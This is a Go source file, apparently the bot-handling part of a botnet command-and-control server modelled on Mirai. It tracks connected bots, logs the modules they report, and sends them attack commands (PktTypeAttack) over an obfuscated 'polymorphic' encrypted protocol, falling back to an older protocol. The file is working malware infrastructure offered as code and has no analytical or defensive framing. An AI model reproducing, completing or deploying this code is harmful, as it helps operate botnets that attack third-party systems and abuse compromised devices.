package main

import (
	"encoding/binary"
	"io"
	"log"
	"net"
	"time"
)

type Bot struct {
	uid     int
	conn    net.Conn
	version byte
	source  string
	ctx     *HandshakeCtx
}

func NewBot(conn net.Conn, version byte, source string, ctx *HandshakeCtx) *Bot {
	return &Bot{-1, conn, version, source, ctx}
}

func (this *Bot) Handle() {
	clientList.AddClient(this)
	defer clientList.DelClient(this)
	if debugMode {
		log.Printf("[bot] %s handle start", this.conn.RemoteAddr())
	}

	if this.ctx != nil && this.ctx.Valid {
		// polymorphic mode: read wire-framed packets, handle responses
		rdbuf := make([]byte, 8192)
		for {
			this.conn.SetDeadline(time.Now().Add(180 * time.Second))
			_, err := io.ReadFull(this.conn, rdbuf[:2])
			if err != nil {
				if debugMode {
					log.Printf("[bot] %s disconnected: %v", this.conn.RemoteAddr(), err)
				}
				return
			}
			wireLen := int(binary.BigEndian.Uint16(rdbuf[:2]))
			if wireLen < 4 || wireLen > len(rdbuf) {
				return
			}
			_, err = io.ReadFull(this.conn, rdbuf[:wireLen])
			if err != nil {
				return
			}
			pktType, _, payload, err := polymorphicRecvInplace(this.ctx, rdbuf[:wireLen])
			if err != nil {
				continue
			}
			if pktType == PktTypeModuleList && len(payload) > 0 {
				log.Printf("[module] %s: %s", this.conn.RemoteAddr(), string(payload))
			}
		}
	}

	// legacy keepalive echo for old protocol
	buf := make([]byte, 2)
	for {
		this.conn.SetDeadline(time.Now().Add(180 * time.Second))
		n, err := this.conn.Read(buf)
		if err != nil {
			if debugMode {
				log.Printf("[bot] %s read err: %v", this.conn.RemoteAddr(), err)
			}
			return
		}
		if n != len(buf) {
			if debugMode {
				log.Printf("[bot] %s read short: %d", this.conn.RemoteAddr(), n)
			}
			return
		}
		nw, err := this.conn.Write(buf)
		if err != nil {
			if debugMode {
				log.Printf("[bot] %s write err: %v", this.conn.RemoteAddr(), err)
			}
			return
		}
		if nw != len(buf) {
			if debugMode {
				log.Printf("[bot] %s write short: %d", this.conn.RemoteAddr(), nw)
			}
			return
		}
	}
}

func (this *Bot) QueueBuf(buf []byte) {
	if len(buf) < 2 {
		return
	}

	if this.ctx != nil && this.ctx.Valid {
		pktLen := int(binary.BigEndian.Uint16(buf[:2]))
		if pktLen > len(buf)-2 {
			return
		}
		payload := buf[2 : 2+pktLen]

		polymorphicSend(this.conn, this.ctx, PktTypeAttack, 0, payload)
		return
	}

	// fallback to old protocol
	if protoReady() {
		protoDecrypt(buf[2:])
	}
	if debugMode {
		ln := int(binary.BigEndian.Uint16(buf[:2]))
		log.Printf("[bot] %s QueueBuf %d bytes (payload len=%d)", this.conn.RemoteAddr(), len(buf), ln)
	}
	this.conn.Write(buf)
}

func (this *Bot) SendPkt(pktType uint8, payload []byte) {
	if this.ctx != nil && this.ctx.Valid {
		polymorphicSend(this.conn, this.ctx, pktType, 0, payload)
		return
	}
	// fallback: wire_len prefix
	buf := make([]byte, 2+len(payload))
	binary.BigEndian.PutUint16(buf, uint16(len(payload)))
	copy(buf[2:], payload)
	this.conn.Write(buf)
}
